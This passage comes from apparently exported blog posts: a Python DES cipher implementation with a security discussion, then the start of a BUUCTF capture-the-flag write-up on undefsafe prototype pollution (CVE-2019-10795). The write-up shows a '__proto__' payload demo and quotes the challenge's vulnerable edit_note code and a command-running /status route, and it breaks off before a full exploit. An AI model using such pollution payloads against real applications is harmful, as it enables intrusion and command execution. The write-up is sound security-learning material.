class=\"number\">9</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">14</span>,<span class=\"number\">11</span>,<span class=\"number\">2</span>,<span class=\"number\">12</span>,<span class=\"number\">4</span>,<span class=\"number\">7</span>,<span class=\"number\">13</span>,<span class=\"number\">1</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>,<span class=\"number\">15</span>,<span class=\"number\">10</span>,<span class=\"number\">3</span>,<span class=\"number\">9</span>,<span class=\"number\">8</span>,<span class=\"number\">6</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">11</span>,<span class=\"number\">10</span>,<span class=\"number\">13</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">15</span>,<span class=\"number\">9</span>,<span class=\"number\">12</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">3</span>,<span class=\"number\">0</span>,<span class=\"number\">14</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">11</span>,<span class=\"number\">8</span>,<span class=\"number\">12</span>,<span class=\"number\">7</span>,<span class=\"number\">1</span>,<span class=\"number\">14</span>,<span class=\"number\">2</span>,<span class=\"number\">13</span>,<span class=\"number\">6</span>,<span class=\"number\">15</span>,<span class=\"number\">0</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">3</span>]]</span><br><span class=\"line\">\ts6 = [[<span class=\"number\">12</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">15</span>,<span class=\"number\">9</span>,<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">0</span>,<span class=\"number\">13</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">14</span>,<span class=\"number\">7</span>,<span class=\"number\">5</span>,<span class=\"number\">11</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">10</span>,<span class=\"number\">15</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">7</span>,<span class=\"number\">12</span>,<span class=\"number\">9</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">1</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">0</span>,<span class=\"number\">11</span>,<span class=\"number\">3</span>,<span class=\"number\">8</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">9</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">5</span>,<span class=\"number\">2</span>,<span class=\"number\">8</span>,<span class=\"number\">12</span>,<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>,<span class=\"number\">4</span>,<span class=\"number\">10</span>,<span class=\"number\">1</span>,<span class=\"number\">13</span>,<span class=\"number\">11</span>,<span class=\"number\">6</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">4</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">12</span>,<span class=\"number\">9</span>,<span class=\"number\">5</span>,<span class=\"number\">15</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">14</span>,<span class=\"number\">1</span>,<span class=\"number\">7</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>]]</span><br><span class=\"line\">\ts7 = [[<span class=\"number\">4</span>,<span class=\"number\">11</span>,<span class=\"number\">2</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">0</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">3</span>,<span class=\"number\">12</span>,<span class=\"number\">9</span>,<span class=\"number\">7</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">6</span>,<span class=\"number\">1</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">13</span>,<span class=\"number\">0</span>,<span class=\"number\">11</span>,<span class=\"number\">7</span>,<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">14</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">12</span>,<span class=\"number\">2</span>,<span class=\"number\">15</span>,<span class=\"number\">8</span>,<span class=\"number\">6</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">11</span>,<span class=\"number\">13</span>,<span class=\"number\">12</span>,<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">14</span>,<span class=\"number\">10</span>,<span class=\"number\">15</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">0</span>,<span class=\"number\">5</span>,<span class=\"number\">9</span>,<span class=\"number\">2</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">6</span>,<span class=\"number\">11</span>,<span class=\"number\">13</span>,<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">10</span>,<span class=\"number\">7</span>,<span class=\"number\">9</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>,<span class=\"number\">15</span>,<span class=\"number\">14</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">12</span>]]</span><br><span class=\"line\">\ts8 = [[<span class=\"number\">13</span>,<span class=\"number\">2</span>,<span class=\"number\">8</span>,<span class=\"number\">4</span>,<span class=\"number\">6</span>,<span class=\"number\">15</span>,<span class=\"number\">11</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">9</span>,<span class=\"number\">3</span>,<span class=\"number\">14</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>,<span class=\"number\">12</span>,<span class=\"number\">7</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">1</span>,<span class=\"number\">15</span>,<span class=\"number\">13</span>,<span class=\"number\">8</span>,<span class=\"number\">10</span>,<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">4</span>,<span class=\"number\">12</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">11</span>,<span class=\"number\">0</span>,<span class=\"number\">14</span>,<span class=\"number\">9</span>,<span class=\"number\">2</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">7</span>,<span class=\"number\">11</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"number\">9</span>,<span class=\"number\">12</span>,<span class=\"number\">14</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>,<span class=\"number\">10</span>,<span class=\"number\">13</span>,<span class=\"number\">15</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>],</span><br><span class=\"line\">\t\t[<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">14</span>,<span class=\"number\">7</span>,<span class=\"number\">4</span>,<span class=\"number\">10</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">15</span>,<span class=\"number\">12</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">11</span>]]</span><br><span class=\"line\">\tre = []</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">48</span>//<span class=\"number\">6</span>):</span><br><span class=\"line\">\t    re.append(data[<span class=\"number\">6</span>*i:<span class=\"number\">6</span>*i+<span class=\"number\">6</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 开始进行s盒置换</span></span><br><span class=\"line\">\tdic = [s1,s2,s3,s4,s5,s6,s7,s8]</span><br><span class=\"line\">\tretn = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\t\tr = int(re[i][<span class=\"number\">0</span>] + re[i][<span class=\"number\">5</span>],<span class=\"number\">2</span>)</span><br><span class=\"line\">\t\tc = int(re[i][<span class=\"number\">1</span>:<span class=\"number\">5</span>], <span class=\"number\">2</span>)</span><br><span class=\"line\">\t\ttemp = str(bin(dic[i][r][c]))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">\t\ttemp = <span class=\"string\">\"0\"</span>*(<span class=\"number\">4</span>-len(temp)) + temp</span><br><span class=\"line\">\t\tretn += temp</span><br><span class=\"line\">\t<span class=\"comment\"># print(len(retn))</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> retn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># p盒置换，输入输出均为32位</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">p_replace</span><span class=\"params\">(data)</span>:</span></span><br><span class=\"line\">\tp = [<span class=\"number\">15</span>, <span class=\"number\">6</span>, <span class=\"number\">19</span>, <span class=\"number\">20</span>, <span class=\"number\">28</span>, <span class=\"number\">11</span>, <span class=\"number\">27</span>, <span class=\"number\">16</span>, <span class=\"number\">0</span>, <span class=\"number\">14</span>, <span class=\"number\">22</span>, <span class=\"number\">25</span>, <span class=\"number\">4</span>, <span class=\"number\">17</span>, <span class=\"number\">30</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, </span><br><span class=\"line\">\t\t<span class=\"number\">23</span>, <span class=\"number\">13</span>, <span class=\"number\">31</span>, <span class=\"number\">26</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">18</span>, <span class=\"number\">12</span>, <span class=\"number\">29</span>, <span class=\"number\">5</span>, <span class=\"number\">21</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>, <span class=\"number\">24</span>]</span><br><span class=\"line\">\tre = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>):</span><br><span class=\"line\">\t\tre  += data[p[i]]</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># F函数，32位数据，子秘钥，轮数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">f_function</span><span class=\"params\">(data, key, round)</span>:</span></span><br><span class=\"line\">\tcipher = data   <span class=\"comment\"># 左侧32位</span></span><br><span class=\"line\">\tcipher = e_replace(cipher)</span><br><span class=\"line\">\tcipher = secret_plus(cipher, key)</span><br><span class=\"line\">\tcipher = s_replace(cipher)</span><br><span class=\"line\">\tcipher = p_replace(cipher)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> cipher</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">convert_key_bin</span><span class=\"params\">(key)</span>:</span></span><br><span class=\"line\">\tword = key</span><br><span class=\"line\">\tkey = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> word:</span><br><span class=\"line\">\t\tkey += <span class=\"string\">f'<span class=\"subst\">&#123;bin(ord(i))[<span class=\"number\">2</span>:]:<span class=\"number\">0</span>&gt;<span class=\"number\">8</span>&#125;</span>'</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> key</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 终极加密函数，参数为秘钥和明文(明文暂时测试为64位以内)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">des_encrypt</span><span class=\"params\">(ptext, key)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">17</span>):</span><br><span class=\"line\">\t\tl[i] = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\tr[i] = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\tkey = convert_key_bin(key)</span><br><span class=\"line\">\tcipher = init_replace(ptext)</span><br><span class=\"line\">\tl[<span class=\"number\">0</span>] = cipher[<span class=\"number\">0</span>:<span class=\"number\">32</span>]</span><br><span class=\"line\">\tr[<span class=\"number\">0</span>] = cipher[<span class=\"number\">32</span>:]</span><br><span class=\"line\">\t<span class=\"comment\"># 进行16层循环</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">16</span>):</span><br><span class=\"line\">\t\tl[i] = r[i<span class=\"number\">-1</span>]</span><br><span class=\"line\">\t\tsecret_key = generate_secretkey(key,i) <span class=\"comment\"># 生成子秘钥</span></span><br><span class=\"line\">\t\tf_result = f_function(r[i<span class=\"number\">-1</span>],secret_key,i)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>):</span><br><span class=\"line\">\t\t\tr[i] += str(int(l[i<span class=\"number\">-1</span>][j])^int(f_result[j]))</span><br><span class=\"line\">\tsecret_key = generate_secretkey(key,<span class=\"number\">16</span>)</span><br><span class=\"line\">\tf_result = f_function(r[<span class=\"number\">15</span>],secret_key,<span class=\"number\">16</span>)</span><br><span class=\"line\">\tl[<span class=\"number\">16</span>] = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>):</span><br><span class=\"line\">\t\tl[<span class=\"number\">16</span>] += str(int(l[<span class=\"number\">15</span>][j])^int(f_result[j]))</span><br><span class=\"line\">\tr[<span class=\"number\">16</span>] = r[<span class=\"number\">15</span>]</span><br><span class=\"line\">\ttemp = l[<span class=\"number\">16</span>] + r[<span class=\"number\">16</span>]</span><br><span class=\"line\">\tfinal_cipher = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">64</span>):</span><br><span class=\"line\">\t\tfinal_cipher += temp[_ip[i]]</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"string\">f'<span class=\"subst\">&#123;hex(int(final_cipher,<span class=\"number\">2</span>))[<span class=\"number\">2</span>:]:<span class=\"number\">0</span>&gt;<span class=\"number\">16</span>&#125;</span>'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">des_decrypt</span><span class=\"params\">(cipher,key)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">17</span>):</span><br><span class=\"line\">\t\tl[i] = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\tr[i] = <span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 恢复为64位密文</span></span><br><span class=\"line\">\tkey = convert_key_bin(key)</span><br><span class=\"line\">\ttemp = bin(int(cipher, <span class=\"number\">16</span>))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">\tcipher = <span class=\"string\">\"0\"</span>*(<span class=\"number\">64</span>-len(temp)) + temp</span><br><span class=\"line\">\tcipher = init_replace(cipher)</span><br><span class=\"line\">\tl[<span class=\"number\">16</span>] = cipher[:<span class=\"number\">32</span>]</span><br><span class=\"line\">\tr[<span class=\"number\">16</span>] = cipher[<span class=\"number\">32</span>:]</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>,<span class=\"number\">1</span>,<span class=\"number\">-1</span>):</span><br><span class=\"line\">\t\tl[i<span class=\"number\">-1</span>] = r[i]</span><br><span class=\"line\">\t\tsecret_key = generate_secretkey(key,i) <span class=\"comment\"># 生成子秘钥</span></span><br><span class=\"line\">\t\tf_result = f_function(r[i],secret_key,i)</span><br><span class=\"line\">\t\tr[i<span class=\"number\">-1</span>] = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>):</span><br><span class=\"line\">\t\t\tr[i<span class=\"number\">-1</span>] += str(int(l[i][j])^int(f_result[j]))</span><br><span class=\"line\">\tr[<span class=\"number\">0</span>] = r[<span class=\"number\">1</span>]</span><br><span class=\"line\">\tsecret_key = generate_secretkey(key,<span class=\"number\">1</span>)</span><br><span class=\"line\">\tl[<span class=\"number\">0</span>] = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\tf_result = f_function(r[<span class=\"number\">1</span>],secret_key,<span class=\"number\">1</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>):</span><br><span class=\"line\">\t\tl[<span class=\"number\">0</span>] += str(int(l[<span class=\"number\">1</span>][j])^int(f_result[j]))</span><br><span class=\"line\">\ttemp = l[<span class=\"number\">0</span>] + r[<span class=\"number\">0</span>]</span><br><span class=\"line\">\tbintext = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">64</span>):</span><br><span class=\"line\">\t\tbintext += temp[_ip[i]]</span><br><span class=\"line\">\tplaintext = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\t\tplaintext += chr(int(bintext[<span class=\"number\">8</span>*i:<span class=\"number\">8</span>*i+<span class=\"number\">8</span>],<span class=\"number\">2</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> plaintext</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2bin</span><span class=\"params\">(text)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> len(text) % <span class=\"number\">8</span> != <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\ttext = text + <span class=\"string\">\" \"</span>*(<span class=\"number\">8</span>-(len(text)%<span class=\"number\">8</span>))</span><br><span class=\"line\">\tbinplain = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> text:</span><br><span class=\"line\">\t\tbinplain += <span class=\"string\">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class=\"number\">2</span>:])</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> binplain</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span><span class=\"params\">(text, key)</span>:</span></span><br><span class=\"line\">\tlongbinplain = str2bin(text)</span><br><span class=\"line\">\tgroup_plain = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\tlongcipher = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(longbinplain)//<span class=\"number\">64</span>):</span><br><span class=\"line\">\t\tgroup_plain = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\tgroup_plain = longbinplain[<span class=\"number\">64</span>*i:<span class=\"number\">64</span>*i+<span class=\"number\">64</span>]</span><br><span class=\"line\">\t\tlongcipher += des_encrypt(group_plain,key)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> longcipher\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(cipher,key)</span>:</span></span><br><span class=\"line\">\tplaintext = <span class=\"string\">\"\"</span>\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(cipher)//<span class=\"number\">16</span>):</span><br><span class=\"line\">\t\tplaintext += des_decrypt(cipher[<span class=\"number\">16</span>*i:<span class=\"number\">16</span>*i+<span class=\"number\">16</span>], key)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> plaintext.rstrip()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">\tmode =  sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> mode <span class=\"keyword\">in</span> (<span class=\"string\">\"e\"</span>,<span class=\"string\">\"d\"</span>):</span><br><span class=\"line\">\t\tdata = input(<span class=\"string\">\"Plz input data: \"</span>)</span><br><span class=\"line\">\t\tkey = str(input(<span class=\"string\">\"Plz input key: \"</span>))</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> mode == <span class=\"string\">\"e\"</span>:</span><br><span class=\"line\">\t\t\tans = encrypt(data, key)</span><br><span class=\"line\">\t\t\tprint(ans)</span><br><span class=\"line\">\t\t<span class=\"keyword\">elif</span> mode == <span class=\"string\">\"d\"</span>:</span><br><span class=\"line\">\t\t\tans = decrypt(data, key)</span><br><span class=\"line\">\t\t\tprint(ans)</span><br><span class=\"line\">\t\tmode = input(<span class=\"string\">\"quit or continue?\\n\"</span>)</span><br></pre></td></tr></table></figure>\n<p>为了增强通用性，增加代码重用性，该算法使用了包封装，从而使其能够被其它程序重用。该DES支持短信息加密，也支持长消息加密。为了使密文便于显示和存储转化为16进制显示</p>\n<p><em>实例演示：</em></p>\n<p><img src=\"/2019/01/15/crypto1/4.png\" alt=\"demo\"></p>\n<p><em>安全性分析</em></p>\n<p>​    DES算法具有极高的安全性，到目前为止，除了用穷举搜索法对DES算法进行攻击外，还没有发现更有效的办法。 而56位长的密钥的穷举空间为2^56，这意味着如果一台计算机的速度是每一秒钟检测一百万个密钥，则它搜索完全部密钥就需要将近2285年的时间，可见，这是难以实现的。然而，这并不等于说DES是不可破解的。而实际上，随着硬件技术和Internet的发展，其破解的可能性越来越大，而且，所需要的时间越来越少。使用经过特殊设计的硬件并行处理要几个小时。</p>\n<p>​    由DES算法的密钥生成步骤中我们可以看到：DES算法中只用到64位密钥中的其中56位，而第8、16、24、……64位8个位并未参与DES运算，这一点，向我们提出了一个应用上的要求，即DES的安全性是基于除了8，16，24，……64位外的其余56位的组合变化256才得以保证的。因此，在实际应用中，我们应避开使用第8，16，24，……64位作为有效数据位，而使用其它的56位作为有效数据位，才能保证DES算法安全可靠地发挥作用。如果不了解这一点，把密钥Key的8，16，24，….. .64位作为有效数据使用，将不能保证DES加密数据的安全性，对运用DES来达到保密作用的系统产生数据被破译的危险，这正是DES算法在应用上的误区，留下了被人攻击、被人破译的极大隐患。</p>\n<p>​    此外，由于DES算法各轮（F函数）的子密钥是通过改变初始密钥这种方式得到的，因此有些初始密钥成了弱密钥（weakkey）。初始密钥分成两部分，每部分各自独立的移动。如果每一部分的所有位都是0或1，那么算法的任意一个周期的密钥都是相同的。当密钥是全1、全0、或者一半全1、一半全0时，会发生这种情况。所以<em>我们在选择密钥时要进行检查，以防止产生弱密钥</em>。</p>\n<p>​    随着密码学的发展，差分分析和线性分析的发展对分组密码的安全性构成了挑战，也推动了分组密码设计技术的发展。</p>\n<p>​    随着计算机计算能力的提高与密码分析技术的进步，DES的密钥长度已经被证明不能够满足当前安全性能的需求，为了克服DES密钥空间小的缺陷，人们又提出了三重DES的变形形式，即使用多个不同的DES秘钥利用DES算法对明文进行多次加密，这样可以增加密钥量。</p>\n<p><em>算法实用性分析</em></p>\n<p>​    DES算法拥有着良好的安全性，目前最有效的破解方法依然是穷举攻击，所以在一些安全性要求相对不高的情况下可以使用DES算法，此外，由于DES的广泛的使用量，为了充分利用有关DES的软硬件资源，可以使用DES的改进算法如三重DES算法等。</p>\n<p>​    由于DES算法要进行多轮迭代，所以DES的运算速度相对较慢，此外，密码生命周期也比较短。</p>\n<hr>\n<p>​    分组密码与序列密码相比，具有扩散性好，插入敏感等优点，缺点是加解密处理速度慢、存在错误传播。用途上，在对于处理数据分组的应用，比如文件传递、电子邮件，分组密码非常合适。 </p>\n","categories":["Record"],"tags":["Crypto"]},{"title":"BUUCTF_WEB(四)","url":"/2020/09/24/buuctf3/","content":"<p>原型链污染学习</p>\n<a id=\"more\"></a>\n<h1 id=\"网鼎杯-2020-青龙组-notes\"><a href=\"#网鼎杯-2020-青龙组-notes\" class=\"headerlink\" title=\"[网鼎杯 2020 青龙组]notes\"></a>[网鼎杯 2020 青龙组]notes</h1><h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>undefsafe存在原型链漏洞，CVE编号为CVE-2019-10795，undefsafe是一个简单的函数，能够检索深层对象属性值从而避免出现<code>Cannot read property &#39;X&#39; of undefined</code>错误。例如下列代码段：<br><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj=&#123;</span><br><span class=\"line\">    a:&#123;</span><br><span class=\"line\">        b:&#123;</span><br><span class=\"line\">            c:<span class=\"number\">1</span>,</span><br><span class=\"line\">            d:<span class=\"string\">'aesm1p'</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>如果此时我们打印不存在的变量，会导致报错</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(obj.a.b);</span><br><span class=\"line\"><span class=\"comment\">//&#123; c: 1, d: 'aesm1p' &#125;</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj.a.f);</span><br><span class=\"line\"><span class=\"comment\">//undefined</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj.e.f);</span><br><span class=\"line\"><span class=\"comment\">//Uncaught TypeError: Cannot read property 'f' of undefined</span></span><br></pre></td></tr></table></figure>\n<p>可以看到，由于访问到了不存在的属性的属性，导致了报错，如果程序运行中遇到这个问题报错终止会很麻烦，而undefsafe模块则可以解决这个问题</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> undef = <span class=\"built_in\">require</span>(<span class=\"string\">'undefsafe'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(undef(obj,<span class=\"string\">'a.b'</span>));</span><br><span class=\"line\"><span class=\"comment\">//&#123; c: 1, d: 'aesm1p' &#125;</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(undef(obj,<span class=\"string\">'a.f'</span>));</span><br><span class=\"line\"><span class=\"comment\">//undefined</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(undef(obj,<span class=\"string\">'e.f'</span>));</span><br><span class=\"line\"><span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure>\n<p>该函数还能对不存在的属性进行赋值</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(obj);</span><br><span class=\"line\"><span class=\"comment\">//&#123; a: &#123; b: &#123; c: 1, d: 'aesm1p' &#125; &#125; &#125;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> res = undef(obj,<span class=\"string\">'e.f'</span>,<span class=\"string\">'new'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj);</span><br><span class=\"line\"><span class=\"comment\">//&#123; a: &#123; b: &#123; c: 1, d: 'aesm1p' &#125; &#125;, f: 'new' &#125;</span></span><br></pre></td></tr></table></figure>\n<p><strong>漏洞细节</strong></p>\n<p>漏洞出现原因在于原型链污染，如下列代码段，a函数会被欺骗通过<code>__proto__</code>来增加或者修改<code>Object.prototype</code>的属性值，例如</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"built_in\">require</span>(<span class=\"string\">\"undefsafe\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> payload = <span class=\"string\">\"__proto__.toString\"</span>;</span><br><span class=\"line\">a(&#123;&#125;,payload,<span class=\"string\">\"JHU\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(&#123;&#125;.toString);</span><br><span class=\"line\"><span class=\"comment\">//JHU</span></span><br></pre></td></tr></table></figure>\n<p>那么回到本题中，用到了<code>undefsafe</code>模块的代码段有两处</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">get_note(id) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> r = &#123;&#125;</span><br><span class=\"line\">    undefsafe(r, id, undefsafe(<span class=\"keyword\">this</span>.note_list, id));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">edit_note(id, author, raw) &#123;</span><br><span class=\"line\">    undefsafe(<span class=\"keyword\">this</span>.note_list, id + <span class=\"string\">'.author'</span>, author);</span><br><span class=\"line\">    undefsafe(<span class=\"keyword\">this</span>.note_list, id + <span class=\"string\">'.raw_note'</span>, raw);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>get_note函数传入两个参数，edit_note函数的undefsafe模块存在原型链攻击<br>查看代码，发现status路由存在命令执行</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">app.route(<span class=\"string\">'/status'</span>)</span><br><span class=\"line\">    .get(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> commands = &#123;</span><br><span class=\"line\">            <span class=\"string\">\"script-1\"</span>: <span class=\"string\">\"uptime\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"script-2\"</span>: <span class=\"string\">\"free -m\"</span></span><br><span class=\"line\">        